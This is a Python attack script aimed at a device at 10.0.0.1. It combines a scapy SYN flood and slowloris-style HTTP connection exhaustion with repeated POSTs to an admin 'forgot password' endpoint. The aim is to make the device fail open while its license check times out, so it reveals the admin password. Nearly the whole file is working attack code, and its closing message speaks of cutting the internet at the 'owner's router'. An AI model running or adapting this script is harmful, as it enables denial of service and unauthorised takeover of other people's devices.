import scapy.all as scapy
import requests
import threading
import time
import socket
import re
import sys

TARGET = "10.0.0.1"
ADMIN_FORGOT = f"http://{TARGET}/admin/index?execute=1&exec=forgot"
found_password = threading.Event()
admin_password = [None]

scapy.conf.use_pcap = True

def fast_syn_flood(duration=120):
    """Maximum rate SYN flood"""
    ip = scapy.IP(dst=TARGET)
    tcp = scapy.TCP(dport=80, flags="S")
    
    start = time.time()
    sent = 0
    
    print(f"[*] Fast SYN flood for {duration}s")
    
    while time.time() - start < duration and not found_password.is_set():
        try:
            tcp.sport = (sent % 65535)
            tcp.seq = (sent * 1000) % 2**32
            scapy.send(ip/tcp, verbose=0)
            sent += 1
        except:
            pass
        
        if sent % 1000 == 0:
            rate = sent / (time.time() - start)
            print(f"\r[>] SYN: {sent} pkts, {rate:.0f} pps", end="")
    
    print(f"\n[*] SYN flood done: {sent} packets")
    return sent

def http_exhaust(duration=120):
    """Open many HTTP connections"""
    start = time.time()
    opened = 0
    
    while time.time() - start < duration and not found_password.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, 80))
            # Send partial request and DON'T close
            s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.1\r\nConnection: keep-alive\r\n")
            opened += 1
        except:
            pass
    
    print(f"\n[*] HTTP exhaust done: {opened} connections")

def exploit(delay=30):
    """Try fail-open exploit"""
    try:
        resp = requests.post(ADMIN_FORGOT, 
                           data={"license": "0", "sdcard": "1234567890"},
                           timeout=delay)
        text = resp.text.strip()
        print(f"\n[*] Exploit: [{len(text)}b] '{text[:80]}'")
        
        if "Your admin password is" in text:
            match = re.search(r"Your admin password is:\s*(.+)", text)
            if match:
                pw = match.group(1).strip()
                admin_password[0] = pw
                found_password.set()
                print(f"\n[+] ADMIN PASSWORD: {pw}")
                return True
        
        if "invalid" in text:
            return False
        if "timeout" in text.lower():
            return False
        return False
    except requests.exceptions.Timeout:
        print(f"\n[-] Exploit timed out")
    except Exception as e:
        print(f"\n[-] Exploit error: {e}")
    return False

print("=" * 60)
print("LPB Final DoS + Fail-Open Exploit")
print("=" * 60)

# Start attacks
threads = []
for i in range(4):
    t = threading.Thread(target=http_exhaust, args=(180,), daemon=True)
    threads.append(t)

t = threading.Thread(target=fast_syn_flood, args=(180,), daemon=True)
threads.append(t)

print("[*] Starting attacks...")
for t in threads:
    t.start()

time.sleep(5)

# Exploit attempts with increasing timeout
for timeout in [20, 30, 45, 60]:
    if found_password.is_set():
        break
    
    print(f"\n[*] Exploit attempt (timeout={timeout}s)...")
    if exploit(timeout):
        break
    
    print("[*] Waiting 5s...")
    time.sleep(5)

if found_password.is_set():
    print(f"\n[+] PASSWORD: {admin_password[0]}")
else:
    print(f"\n[-] Failed. Device still can reach license server.")
    print("[-] Need to cut internet from the WAN side (owner's router)")
